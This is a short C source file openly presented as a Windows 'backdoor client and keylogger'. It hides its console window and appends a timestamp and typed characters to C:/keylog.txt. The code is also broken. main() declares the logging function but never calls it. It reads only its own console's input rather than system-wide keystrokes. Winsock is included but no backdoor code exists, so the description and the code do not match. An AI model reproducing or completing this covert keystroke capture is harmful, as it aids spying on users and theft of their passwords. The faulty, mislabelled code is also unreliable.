/*
 * Title : Keylogger.c
 * Author : Speculo
 * Description : Backdoor client and keylogger. Please, be able to implement this C program into a windows host only.
 * Github : *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
#endif

#define PATH "C:/keylog.txt"


int main() {
    void keyLogger();
    return 0;
}

void keyLogger() {
    int bindIndex = 0;
    char getChar;
    FILE* file;

    time_t t;
    t = time(NULL);

    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    file = fopen(PATH, "a+");
    if (file != NULL) {
        fprintf(file, "%s", ctime(&t));
        fclose(file);
    }

    while (1) {
        Sleep(20);
        if (kbhit()) {
            bindIndex++;
            getChar = getch();

            file = fopen(PATH, "a+");
            if (file != NULL) {
                fprintf(file, "%c", getChar);
                fclose(file);
            }
        }

        if (bindIndex > 50) {
            break;
        }
    }
}
